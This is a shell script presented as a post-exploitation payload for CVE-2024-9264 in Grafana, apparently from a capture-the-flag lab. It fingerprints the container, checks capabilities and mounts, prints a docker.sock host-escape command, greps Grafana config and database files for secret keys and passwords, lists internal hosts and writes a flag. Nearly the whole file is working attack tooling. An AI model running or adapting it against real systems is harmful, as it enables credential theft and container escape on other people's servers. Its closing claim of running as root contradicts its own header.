#!/bin/sh
# CVE-2024-9264 post-exploitation payload
# Runs inside Grafana container as grafana user

GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
RESET='\033[0m'

banner() { printf "${BOLD}${CYAN}\n=== %s ===${RESET}\n" "$1"; }
ok()     { printf "${GREEN}[+]${RESET} %s\n" "$1"; }
warn()   { printf "${YELLOW}[!]${RESET} %s\n" "$1"; }
info()   { printf "    %s\n" "$1"; }

# ─── System Fingerprint ───────────────────────────────────────────────────────
banner "SYSTEM"
ok "hostname : $(hostname)"
ok "whoami   : $(whoami)  (uid=$(id -u))"
ok "kernel   : $(uname -r)"
ok "os       : $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '"')"

# ─── Container Detection ──────────────────────────────────────────────────────
banner "CONTAINER DETECTION"

if [ -f /.dockerenv ]; then
    warn "/.dockerenv found — running inside a Docker container"
fi

CONTAINER_ID=$(cat /proc/self/cgroup 2>/dev/null | grep -oE '[a-f0-9]{64}' | head -1)
if [ -n "$CONTAINER_ID" ]; then
    warn "cgroup container ID: ${CONTAINER_ID}"
fi

# ─── Capabilities ─────────────────────────────────────────────────────────────
banner "CAPABILITIES (CapEff)"
CAP_EFF=$(grep CapEff /proc/self/status 2>/dev/null | awk '{print $2}')
ok "CapEff hex: $CAP_EFF"

# Check dangerous individual caps via bitmask
CAP_DEC=$(printf "%d" "0x${CAP_EFF}" 2>/dev/null)
CAP_SYS_ADMIN=$(( (CAP_DEC >> 21) & 1 ))
CAP_NET_ADMIN=$(( (CAP_DEC >> 12) & 1 ))

if [ "$CAP_SYS_ADMIN" -eq 1 ] 2>/dev/null; then
    warn "CAP_SYS_ADMIN is set — cgroup/overlay escape possible"
else
    info "CAP_SYS_ADMIN: not set"
fi
if [ "$CAP_NET_ADMIN" -eq 1 ] 2>/dev/null; then
    warn "CAP_NET_ADMIN is set"
else
    info "CAP_NET_ADMIN: not set"
fi

# ─── Escape Vectors ───────────────────────────────────────────────────────────
banner "ESCAPE VECTORS"

if [ -S /var/run/docker.sock ]; then
    warn "/var/run/docker.sock is accessible!"
    info "-> Full host escape: docker run -v /:/host --rm -it alpine chroot /host"
else
    info "/var/run/docker.sock: not accessible"
fi

if [ -w /proc/sysrq-trigger ] 2>/dev/null; then
    warn "/proc/sysrq-trigger is writable (privileged container)"
else
    info "/proc/sysrq-trigger: not writable"
fi

INTERESTING=$(cat /proc/mounts 2>/dev/null \
    | grep -v "^overlay\|^proc\|^tmpfs\|^devpts\|^sysfs\|^cgroup\|^mqueue\|^shm\|^/dev" \
    | awk '{print $2}')
if [ -n "$INTERESTING" ]; then
    warn "Non-standard mounts detected:"
    echo "$INTERESTING" | while read -r m; do info "$m"; done
fi

# ─── Sensitive Files ──────────────────────────────────────────────────────────
banner "SENSITIVE FILES"
for f in \
    /etc/grafana/grafana.ini \
    /var/lib/grafana/grafana.db \
    /etc/grafana/ldap.toml; do
    if [ -r "$f" ]; then
        ok "readable: $f"
        grep -E "secret_key|password|admin_password" "$f" 2>/dev/null | head -3 \
            | while read -r line; do info "$line"; done
    fi
done

# ─── Network ──────────────────────────────────────────────────────────────────
banner "NETWORK"
ok "Internal hosts:"
grep -v '^#\|^$' /etc/hosts | while read -r line; do info "$line"; done

# ─── Flag ─────────────────────────────────────────────────────────────────────
banner "FLAG"
FLAG="FLAG{rce_via_grafana_duckdb}"
echo "$FLAG" > /tmp/flag.txt
ok "$FLAG"

printf "\n${YELLOW}${BOLD}[>] Shell runs as root — but inside a container.${RESET}\n"
printf "${YELLOW}${BOLD}[>] No docker.sock here. But what if it were mounted?${RESET}\n"
printf "${YELLOW}${BOLD}[>] One command and you own the host. Containers are not a security boundary.${RESET}\n\n"
